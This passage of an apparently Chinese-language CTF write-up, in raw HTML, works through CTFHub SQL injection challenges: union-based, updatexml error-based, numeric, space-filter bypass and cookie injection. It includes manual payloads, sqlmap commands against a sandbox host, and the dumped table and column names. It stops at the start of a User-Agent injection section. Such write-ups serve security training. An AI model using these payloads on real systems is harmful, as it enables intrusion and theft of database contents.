正常回显</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2 返回错误</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>   返回错误，需加注释符号<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1#  正常回显</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>#  返回错误<br></code></pre></td></tr></table></figure><p>可以判断为字符型注入</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 #   回显正常</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> #   回显正常<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 #   返回错误</span><br></code></pre></td></tr></table></figure><p>所以字段数为2</p><p>3.联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 1,2#  回显正常</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#         回显正常<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3#       返回错误</span><br></code></pre></td></tr></table></figure><p>回显点位是2和3</p><p>3.爆数据库名，得到数据库名sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure><p>4.爆表名，得到两个表名 news,flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>5.爆字段名，字段名flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>6.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(flag) from flag#</span><br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>百度了一下报错注入，报错注入是我们通过反馈出来的错误来获取到我们所需要的信息，发现一共有<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种报错注入</a>，最常用到的三种报错注入方式分别是：<code>updatexml()</code>、<code>floor()</code>、<code>extractvalue()</code>。<br>太菜了，看了下大师傅们的wp，发现这道题就是利用<code>updatexml()</code>函数进行报错注入</p><p><a href="https://www.cnblogs.com/0daybug/p/12334557.html">updatexml()语法：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">UPDATEXML (XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>XML_document</td><td>XML_document是String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>XPath_string (Xpath格式的字符串) ，xpath报错只显示32位结果</td></tr><tr><td>new_value</td><td>new_value，String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>updatexml的报错原理</strong>：</p><blockquote><p>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数很明显不是，而是我们想要获得的数据，所以会报错，并且在报错的时候会将其内容显示出来，从而获得我们想要的数据。</p></blockquote><p>使用updatexml报错注入固定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload：?id=a<span class="hljs-string">&#x27;and(updatexml(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select语句())),&quot;anything&quot;))</span><br></code></pre></td></tr></table></figure><p><code>concat()</code>函数将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出想要的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114214226330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆库名，查到数据库名为sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205812885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆字段，一个news，一个flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205926889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆字段名，字段名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114210012894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205438234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>好像只有一部分flag，这个时候就用到了<code>mid()</code>函数<br><img src="https://img-blog.csdnimg.cn/20201114213929117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用mid函数来进行字符截取,来显示另外一半flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,mid((select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205554257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p><img src="https://img-blog.csdnimg.cn/20210127170719344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/2021012717113182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入<br>2.判断回显点位<br>输入<code>1 order by 2</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127171405960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>回显点位为1,2<br><img src="https://img-blog.csdnimg.cn/20210127171713726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127171630811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有news和nrjduumafr表<br><img src="https://img-blog.csdnimg.cn/2021012717191096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.查字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;nrjduumafr&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为qejxezuixk<br><img src="https://img-blog.csdnimg.cn/20210127172046307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> qejxezuixk,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> nrjduumafr<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127172202287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>输入1，回显ctfhub；输入2，回显skill；输入3，无回显。<br><img src="https://img-blog.csdnimg.cn/20210127121828345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过空格过滤的方式： <code>/**/、()、%0a</code>。</p><p>用%0a代替空格输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>有回显<br><img src="https://img-blog.csdnimg.cn/20210127122947660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127124529352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>database(),<span class="hljs-number">2</span> <br></code></pre></td></tr></table></figure><p> 数据库为sqli<img src="https://img-blog.csdnimg.cn/20210127125025284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <br></code></pre></td></tr></table></figure><p>sqli中有两个表，分别为 rrkdctjwlf和news<br><img src="https://img-blog.csdnimg.cn/20210127125119950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rrkdctjwlf&#x27;</span><br></code></pre></td></tr></table></figure><p>rrkdctjwlf表中，有一个字段wonevkchnv<br><img src="https://img-blog.csdnimg.cn/20210127125346665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看字段的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>wonevkchnv,<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>rrkdctjwlf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012712590372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127144717532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burpsuite抓包，可以看到Cookie里面有id参数<br><img src="https://img-blog.csdnimg.cn/20210127144902149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br><code>id=1 and 1=1</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127145409657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>id=1 and 1=2</code>无回显<br><img src="https://img-blog.csdnimg.cn/20210127145335993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入</p><p>2.判断字段数<br>当<code>id=1 order by 2</code> 时回显正常，当<code>id=1 order by 3</code>时无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127145658543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127145752840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表，usrnjffgta和news<br><img src="https://img-blog.csdnimg.cn/20210127145910479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;usrnjffgta&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为wbloxpuwcu<br><img src="https://img-blog.csdnimg.cn/20210127150117665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(wbloxpuwcu) <span class="hljs-keyword">from</span> usrnjffgta<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150238553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–Cookie注入</strong></p><blockquote><p>在sqlmap中使用cookie注入，level &gt;=2才行</p></blockquote><p>首先检测是否有cookie注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2  </span><br></code></pre></td></tr></table></figure><p>存在Cookie注入<br><img src="https://img-blog.csdnimg.cn/20210127151950563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用kali里面的sqlmap工具<br>1.查库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 --dbs   </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150746902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012715085841.png" alt="在这里插入图片描述"><br>3.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151427189.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta -C wbloxpuwcu --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151344509.png" alt="在这里插入图片描述"></p><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127152415405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示输入点在User-Agent，使用bp抓包<br><img 